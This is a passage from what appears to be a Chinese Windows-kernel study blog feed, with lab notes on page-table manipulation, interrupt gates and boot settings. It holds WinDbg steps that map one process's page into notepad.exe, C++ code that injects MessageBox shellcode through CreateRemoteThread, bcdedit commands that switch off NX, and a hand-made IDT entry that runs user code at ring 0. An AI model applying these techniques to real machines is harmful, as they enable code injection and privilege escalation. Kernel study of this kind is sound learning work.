class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"></span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\r\n&quot;</span>, *mem);</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="带页内偏移挂页"><a href="#带页内偏移挂页" class="headerlink" title="带页内偏移挂页"></a>带页内偏移挂页</h3><blockquote><ol><li>拆地址<br>80000 &#x3D;&gt; 0000 0000 00 | 00 1000 0000 | 0000 0000 0000<br>0000 0000 0000 &#x3D;&gt; 0<br>0000 1000 0000 &#x3D;&gt; 080<br>0000 0000 0000 &#x3D;&gt; 0</li></ol></blockquote><blockquote><ol start="2"><li>WinDBG中设置</li></ol></blockquote><ul><li><p>notepad.exe进程信息<br>PROCESS 87564030  SessionId: 1  Cid: 129c    Peb: 7ffdf000  ParentCid: 0a48<br>  DirBase: 34cc7000  ObjectTable: 95581928  HandleCount:  60.<br>  Image: notepad.exe</p></li><li><p>实验程序进程信息<br>PROCESS 86d307c8  SessionId: 1  Cid: 151c    Peb: 7ffd9000  ParentCid: 1478<br>  DirBase: 1611b000  ObjectTable: 954c7388  HandleCount:  19.<br>  Image: 10_16_HangingPage(¹ÒÒ³).exe</p></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; !dd <span class="number">1611b</span>000        <span class="comment">// 通过实验程序获取PDE</span></span><br><span class="line">#<span class="number">1611b</span>000 <span class="number">2915f</span>867 <span class="number">0</span>c066867 <span class="number">00000000</span> <span class="number">05</span>cdc867</span><br><span class="line">#<span class="number">1611b</span>010 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">1611b</span>020 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">1611b</span>030 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">1611b</span>040 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">1611b</span>050 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">1611b</span>060 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">1611b</span>070 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">kd&gt; !dd <span class="number">2915f</span>000+<span class="number">080</span>*<span class="number">4</span>      <span class="comment">// 获取PTE</span></span><br><span class="line">#<span class="number">2915f</span>200 <span class="number">06204867</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">2915f</span>210 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">2915f</span>220 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">2915f</span>230 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">2915f</span>240 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">2915f</span>250 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">2915f</span>260 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">2915f</span>270 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">kd&gt; !dd <span class="number">06204000</span>            <span class="comment">// 查看数据</span></span><br><span class="line"># <span class="number">6204000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"># <span class="number">6204010</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"># <span class="number">6204020</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"># <span class="number">6204030</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"># <span class="number">6204040</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"># <span class="number">6204050</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"># <span class="number">6204060</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"># <span class="number">6204070</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">kd&gt; !db <span class="number">06204000</span>+<span class="number">0x100</span>      <span class="comment">// 由于页内偏移为0x100, 所以需要加上0x100</span></span><br><span class="line"># <span class="number">6204100</span> <span class="number">6</span>a <span class="number">00</span> <span class="number">6</span>a <span class="number">00</span> <span class="number">6</span>a <span class="number">00</span> <span class="number">6</span>a <span class="number">00</span>-b8 b1 ed da <span class="number">75</span> ff d0 c3 j.j.j.j.....u...</span><br><span class="line"># <span class="number">6204110</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span><span class="number">-00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> ................</span><br><span class="line"># <span class="number">6204120</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span><span class="number">-00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> ................</span><br><span class="line"># <span class="number">6204130</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span><span class="number">-00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> ................</span><br><span class="line"># <span class="number">6204140</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span><span class="number">-00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> ................</span><br><span class="line"># <span class="number">6204150</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span><span class="number">-00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> ................</span><br><span class="line"># <span class="number">6204160</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span><span class="number">-00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> ................</span><br><span class="line"># <span class="number">6204170</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span><span class="number">-00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> ................</span><br><span class="line">kd&gt; !dd <span class="number">34</span>cc7000            <span class="comment">// 获取notepad.exe的PDE</span></span><br><span class="line">#<span class="number">34</span>cc7000 <span class="number">09f</span>40867 <span class="number">3</span>af52867 <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">34</span>cc7010 <span class="number">26825867</span> <span class="number">22b</span>e6867 <span class="number">0</span>c4c7867 <span class="number">30</span>d00867</span><br><span class="line">#<span class="number">34</span>cc7020 <span class="number">3</span>d901867 <span class="number">00000000</span> <span class="number">26f</span>d8867 <span class="number">00000000</span></span><br><span class="line">#<span class="number">34</span>cc7030 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">34</span>cc7040 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">34</span>cc7050 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">34</span>cc7060 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">34</span>cc7070 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">kd&gt; !dd <span class="number">09f</span>40000            <span class="comment">// 获取notepad.exe的PTE</span></span><br><span class="line"># <span class="number">9f</span>40000 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"># <span class="number">9f</span>40010 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"># <span class="number">9f</span>40020 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"># <span class="number">9f</span>40030 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"># <span class="number">9f</span>40040 <span class="number">28f</span>16847 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"># <span class="number">9f</span>40050 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"># <span class="number">9f</span>40060 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"># <span class="number">9f</span>40070 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">kd&gt; !ed <span class="number">09f</span>40000 <span class="number">06204867</span>   <span class="comment">// 将实验程序的PTE挂到notepad.exe的0地址上</span></span><br><span class="line">kd&gt; g</span><br></pre></td></tr></table></figure><blockquote><ol start="3"><li>实验代码</li></ol></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 10_16_HangingPage(挂页).cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(__stdcall * FuncProc)</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">char</span> * mem = (<span class="type">char</span>*)<span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="number">0x100</span>, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">FuncProc func = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(mem, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> bufcode[] = </span><br><span class="line">&#123;</span><br><span class="line"><span class="number">0x6A</span>, <span class="number">0</span>,<span class="comment">// push 0</span></span><br><span class="line"><span class="number">0x6A</span>, <span class="number">0</span>,<span class="comment">// push 0</span></span><br><span class="line"><span class="number">0x6A</span>, <span class="number">0</span>,<span class="comment">// push 0</span></span><br><span class="line"><span class="number">0x6A</span>, <span class="number">0</span>,<span class="comment">// push 0</span></span><br><span class="line"><span class="number">0xb8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,<span class="comment">// mov eax, 0x12345678</span></span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xd0</span>,<span class="comment">// call eax</span></span><br><span class="line"><span class="number">0xc3</span>,<span class="comment">// ret</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">*(<span class="type">int</span>*)&amp;bufcode[<span class="number">9</span>] = (ULONG)MessageBoxA;</span><br><span class="line"><span class="built_in">memcpy</span>(mem+<span class="number">0x100</span>, bufcode, <span class="built_in">sizeof</span>(bufcode));</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x\r\n&quot;</span>, mem);</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// FuncProc func = (FuncProc)mem;</span></span><br><span class="line"><span class="comment">// func();</span></span><br><span class="line">HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, <span class="number">4764</span>);</span><br><span class="line"><span class="keyword">if</span> (INVALID_HANDLE_VALUE == hProcess)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;OpenProcess Failed\r\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">HANDLE hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPTHREAD_START_ROUTINE)<span class="number">0x100</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (INVALID_HANDLE_VALUE == hThread)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;CreateRemoteThread Failed\r\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"></span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\r\n&quot;</span>, *mem);</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Windows内核 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows内核 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows内核-页表配置</title>
      <link href="/220f9f18.html"/>
      <url>/220f9f18.html</url>
      
        <content type="html"><![CDATA[<div class="note info"><p><strong>页表配置</strong></p></div><span id="more"></span><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ul><li>关闭pae选项<br>bcdedit &#x2F;set pae ForceDisable</li><li>设置nx<br>bcdedit &#x2F;set nx AlwaysOff</li></ul>]]></content>
      
      
      <categories>
          
          <category> Windows内核 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows内核 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows内核-中断门</title>
      <link href="/7297abab.html"/>
      <url>/7297abab.html</url>
      
        <content type="html"><![CDATA[<div class="note info"><p><strong>中断门</strong></p></div><span id="more"></span><h2 id="中断门知识点"><a href="#中断门知识点" class="headerlink" title="中断门知识点"></a>中断门知识点</h2><h3 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h3><ul><li><p>int 32的计算: 80b98100 - 80b98000 &#x3D; 100（16进制） &#x2F; 8 &#x3D; 20 &#x3D;&gt; 32（10进制）</p></li><li><p>填充中断门描述符, 函数地址是: 00401080;<br>0040ee00&#96;00081080</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; r idtr</span><br><span class="line">idtr=<span class="number">80b</span>98000</span><br><span class="line">kd&gt; dq <span class="number">80b</span>98000 L30</span><br><span class="line">ReadVirtual: <span class="number">80b</span>98000 <span class="keyword">not</span> properly sign extended</span><br><span class="line"><span class="number">80b</span>98000  <span class="number">83e58</span>e00`<span class="number">00085210</span> <span class="number">83e58</span>e00`<span class="number">0008557</span>c</span><br><span class="line"><span class="number">80b</span>98010  <span class="number">00008500</span>`<span class="number">00580000</span> <span class="number">83e5</span>ee00`<span class="number">00085f</span>c0</span><br><span class="line"><span class="number">80b</span>98020  <span class="number">83e5</span>ee00`<span class="number">00086338</span> <span class="number">83e58</span>e00`<span class="number">00086688</span></span><br><span class="line"><span class="number">80b</span>98030  <span class="number">83e58</span>e00`<span class="number">000869</span>ec <span class="number">83e58</span>e00`<span class="number">000876f</span>8</span><br><span class="line"><span class="number">80b</span>98040  <span class="number">00008500</span>`<span class="number">00500000</span> <span class="number">83e58</span>e00`<span class="number">00087</span>d3c</span><br><span class="line"><span class="number">80b</span>98050  <span class="number">83e58</span>e00`<span class="number">00088050</span> <span class="number">83e58</span>e00`<span class="number">00088380</span></span><br><span class="line"><span class="number">80b</span>98060  <span class="number">83e58</span>e00`<span class="number">000887f</span>0 <span class="number">83e58</span>e00`<span class="number">00088</span>cfc</span><br><span class="line"><span class="number">80b</span>98070  <span class="number">83e58</span>e00`<span class="number">000899b</span>8 <span class="number">83e58</span>e00`<span class="number">00089e40</span></span><br><span class="line"><span class="number">80b</span>98080  <span class="number">83e58</span>e00`<span class="number">0008</span>a154 <span class="number">83e58</span>e00`<span class="number">0008</span>a488</span><br><span class="line"><span class="number">80b</span>98090  <span class="number">00008500</span>`<span class="number">00</span>a00000 <span class="number">83e58</span>e00`<span class="number">0008</span>a7e4</span><br><span class="line"><span class="number">80b</span>980a0  <span class="number">83e58</span>e00`<span class="number">00089e40</span> <span class="number">83e58</span>e00`<span class="number">00089e40</span></span><br><span class="line"><span class="number">80b</span>980b0  <span class="number">83e58</span>e00`<span class="number">00089e40</span> <span class="number">83e58</span>e00`<span class="number">00089e40</span></span><br><span class="line"><span class="number">80b</span>980c0  <span class="number">83e58</span>e00`<span class="number">00089e40</span> <span class="number">83e58</span>e00`<span class="number">00089e40</span></span><br><span class="line"><span class="number">80b</span>980d0  <span class="number">83e58</span>e00`<span class="number">00089e40</span> <span class="number">83e58</span>e00`<span class="number">00089e40</span></span><br><span class="line"><span class="number">80b</span>980e0  <span class="number">83e58</span>e00`<span class="number">00089e40</span> <span class="number">83e58</span>e00`<span class="number">00089e40</span></span><br><span class="line"><span class="number">80b</span>980f0  <span class="number">83e58</span>e00`<span class="number">00089e40</span> <span class="number">83e58</span>e00`<span class="number">0008</span>abb0</span><br><span class="line"><span class="number">80b</span>98100  <span class="number">00000000</span>`<span class="number">00080000</span> <span class="number">00000000</span>`<span class="number">00080000</span></span><br><span class="line"></span><br><span class="line">kd&gt; eq <span class="number">80b</span>98100 <span class="number">0040</span>ee00`<span class="number">00081080</span></span><br><span class="line">kd&gt; dq <span class="number">80b</span>98000 L30</span><br><span class="line">ReadVirtual: <span class="number">80b</span>98000 <span class="keyword">not</span> properly sign extended</span><br><span class="line"><span class="number">80b</span>98000  <span class="number">83e58</span>e00`<span class="number">00085210</span> <span class="number">83e58</span>e00`<span class="number">0008557</span>c</span><br><span class="line"><span class="number">80b</span>98010  <span class="number">00008500</span>`<span class="number">00580000</span> <span class="number">83e5</span>ee00`<span class="number">00085f</span>c0</span><br><span class="line"><span class="number">80b</span>98020  <span class="number">83e5</span>ee00`<span class="number">00086338</span> <span class="number">83e58</span>e00`<span class="number">00086688</span></span><br><span class="line"><span class="number">80b</span>98030  <span class="number">83e58</span>e00`<span class="number">000869</span>ec <span class="number">83e58</span>e00`<span class="number">000876f</span>8</span><br><span class="line"><span class="number">80b</span>98040  <span class="number">00008500</span>`<span class="number">00500000</span> <span class="number">83e58</span>e00`<span class="number">00087</span>d3c</span><br><span class="line"><span class="number">80b</span>98050  <span class="number">83e58</span>e00`<span class="number">00088050</span> <span class="number">83e58</span>e00`<span class="number">00088380</span></span><br><span class="line"><span class="number">80b</span>98060  <span class="number">83e58</span>e00`<span class="number">000887f</span>0 <span class="number">83e58</span>e00`<span class="number">00088</span>cfc</span><br><span class="line"><span class="number">80b</span>98070  <span class="number">83e58</span>e00`<span class="number">000899b</span>8 <span class="number">83e58</span>e00`<span class="number">00089e40</span></span><br><span class="line"><span class="number">80b</span>98080  <span class="number">83e58</span>e00`<span class="number">0008</span>a154 <span class="number">83e58</span>e00`<span class="number">0008</span>a488</span><br><span class="line"><span class="number">80b</span>98090  <span class="number">00008500</span>`<span class="number">00</span>a00000 <span class="number">83e58</span>e00`<span class="number">0008</span>a7e4</span><br><span class="line"><span class="number">80b</span>980a0  <span class="number">83e58</span>e00`<span class="number">00089e40</span> <span class="number">83e58</span>e00`<span class="number">00089e40</span></span><br><span class="line"><span class="number">80b</span>980b0  <span class="number">83e58</span>e00`<span class="number">00089e40</span> <span class="number">83e58</span>e00`<span class="number">00089e40</span></span><br><span class="line"><span class="number">80b</span>980c0  <span class="number">83e58</span>e00`<span class="number">00089e40</span> <span class="number">83e58</span>e00`<span class="number">00089e40</span></span><br><span class="line"><span class="number">80b</span>980d0  <span class="number">83e58</span>e00`<span class="number">00089e40</span> <span class="number">83e58</span>e00`<span class="number">00089e40</span></span><br><span class="line"><span class="number">80b</span>980e0  <span class="number">83e58</span>e00`<span class="number">00089e40</span> <span class="number">83e58</span>e00`<span class="number">00089e40</span></span><br><span class="line"><span class="number">80b</span>980f0  <span class="number">83e58</span>e00`<span class="number">00089e40</span> <span class="number">83e58</span>e00`<span class="number">0008</span>abb0</span><br><span class="line"><span class="number">80b</span>98100  <span class="number">0040</span>ee00`<span class="number">00081080</span> <span class="number">00000000</span>`<span class="number">00080000</span></span><br></pre></td></tr></table></figure></li><li><p>中断门0环堆栈压了五个值, eip, cs, eflags, esp, ss, 3环堆栈无内容;<br>3环寄存器:<br>EAX &#x3D; 00000000 EBX &#x3D; 7FFD5000 ECX &#x3D; BFBDF6C4 EDX &#x3D; 005F0178 ESI &#x3D; 0012FE3C EDI &#x3D; 0012FF08 EIP &#x3D; 004011A7 ESP &#x3D; <code>0012FE3C</code> EBP &#x3D; 0012FF08 EFL &#x3D; 00000246<br>CS &#x3D; 001B DS &#x3D; 0023 ES &#x3D; 0023 SS &#x3D; 0023 FS &#x3D; 003B GS &#x3D; 0000<br>0环寄存器:<br>eax&#x3D;00000000 ebx&#x3D;7ffd5000 ecx&#x3D;bfbdf6c4 edx&#x3D;005f0178 esi&#x3D;0012fe3c edi&#x3D;0012ff08<br>eip&#x3D;00401080 esp&#x3D;<code>94e63c9c</code> ebp&#x3D;0012ff08 iopl&#x3D;0         nv up di pl zr na pe nc<br>cs&#x3D;0008  ss&#x3D;0010  ds&#x3D;0023  es&#x3D;0023  fs&#x3D;0030  gs&#x3D;0000             efl&#x3D;00000046</p></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dds <span class="number">94e63</span>c9c</span><br><span class="line"><span class="number">94e63</span>c9c  <span class="number">004011</span>a9          &lt;== eip</span><br><span class="line"><span class="number">94e63</span>ca0  <span class="number">0000001b</span>          &lt;== cs</span><br><span class="line"><span class="number">94e63</span>ca4  <span class="number">00000246</span>          &lt;== eflags</span><br><span class="line"><span class="number">94e63</span>ca8  <span class="number">0012f</span>e3c          &lt;== esp</span><br><span class="line"><span class="number">94e63</span>cac  <span class="number">00000023</span>          &lt;== ss</span><br><span class="line"><span class="number">94e63</span>cb0  <span class="number">00000000</span></span><br><span class="line"><span class="number">94e63</span>cb4  <span class="number">00000000</span></span><br><span class="line"><span class="number">94e63</span>cb8  <span class="number">00000000</span></span><br><span class="line"><span class="number">94e63</span>cbc  <span class="number">00000000</span></span><br><span class="line"><span class="number">94e63</span>cc0  <span class="number">0000027f</span></span><br></pre></td></tr></table></figure><h3 id="代码实验"><a href="#代码实验" class="headerlink" title="代码实验"></a>代码实验</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 